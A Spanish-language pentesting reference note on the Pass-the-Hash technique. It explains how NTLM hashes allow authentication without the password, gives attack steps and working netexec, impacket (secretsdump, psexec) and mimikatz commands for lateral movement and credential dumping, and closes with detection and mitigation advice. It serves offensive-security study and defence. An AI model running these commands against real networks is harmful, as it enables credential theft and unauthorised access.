---
title: Pass the Hash (PtH)
resumen: Autenticarse con el hash NTLM de una cuenta sin conocer nunca su contraseña en claro.
tags: mimikatz, netexec, impacket
---

## Definición

Técnica que permite a un atacante autenticarse contra cualquier servicio remoto usando únicamente el hash NTLM de una contraseña, sin necesidad de conocer la contraseña real. Funciona porque el protocolo NTLM usa el hash directamente como material criptográfico durante el reto-respuesta, así que da igual si se conoce el hash o la contraseña que lo genera.

## Cuándo se usa

En cuanto se dispone de un hash NTLM (obtenido por ejemplo con `secretsdump`, `mimikatz` o un DCSync), como forma de moverse lateralmente sin tener que crackear ese hash primero.

## Requisitos previos

- Un hash NTLM (**NT hash**) válido de la cuenta objetivo. Los hashes NTLMv1/v2 capturados en red (por ejemplo con Responder) **no** sirven directamente para PtH: hay que crackearlos primero para obtener la contraseña.
- Conectividad con el servicio objetivo (SMB, WinRM, RDP con restricted admin, etc.).

## Desarrollo del ataque

1. Obtener el hash NTLM de la cuenta objetivo (dump local, DCSync, etc.).
2. Autenticarse contra el servicio deseado pasando el hash en vez de la contraseña.
3. Repetir contra otros equipos donde esa misma cuenta tenga privilegios (movimiento lateral en cadena).

```bash
# netexec: validar y autenticar por PtH contra un rango de equipos
nxc smb 10.10.10.0/24 -u "USER" -H 'HASH_NTLM'

# impacket: cualquier herramienta que acepte -hashes
impacket-secretsdump 'dominio.local/USER'@10.10.10.10 -hashes :HASH_NTLM
impacket-psexec dominio.local/USER@10.10.10.10 -hashes :HASH_NTLM
```

```powershell
# mimikatz: (Over) Pass The Hash — abre un proceso nuevo autenticado con ese hash
sekurlsa::pth /user:<Usuario> /ntlm:<HASH> /domain:<DominioFQDN>
```

## Herramientas relacionadas

- Ver [[mimikatz]]
- Ver [[netexec]]
- Ver [[impacket]]

## Detección y mitigación

Activar Credential Guard, restringir el uso de cuentas administrativas locales idénticas en todo el parque (LAPS), deshabilitar NTLM donde sea posible en favor de Kerberos, y monitorizar autenticaciones NTLM tipo 3 (red) desde cuentas privilegiadas hacia múltiples hosts en poco tiempo.
